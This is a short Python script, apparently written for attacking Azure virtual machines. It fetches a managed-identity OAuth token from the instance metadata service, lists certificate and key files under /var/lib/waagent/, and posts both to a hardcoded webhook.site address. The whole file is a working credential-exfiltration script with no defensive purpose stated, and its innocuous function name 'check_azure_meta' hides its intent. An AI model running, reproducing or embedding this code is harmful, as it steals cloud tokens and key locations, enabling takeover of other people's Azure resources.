import requests
import os
import subprocess

WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"

def check_azure_meta():
 
    try:
        imds_url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        response = requests.get(imds_url, headers={"Metadata": "true"}, timeout=5)
        token_info = response.json()
    except Exception as e:
        token_info = f"IMDS access failed: {str(e)}"
 
    azure_files = []
    for root, dirs, files in os.walk("/var/lib/waagent/"):
        for file in files:
            if any(ext in file for ext in ['.crt', '.key', '.pem', '.xml']):
                azure_files.append(os.path.join(root, file))

    data = {
        "imds_token_result": token_info,
        "found_azure_files": azure_files[:10], # Первые 10 найденных файлов
    }
    
    requests.post(WEBHOOK_URL, json=data)

if __name__ == "__main__":
    check_azure_meta()
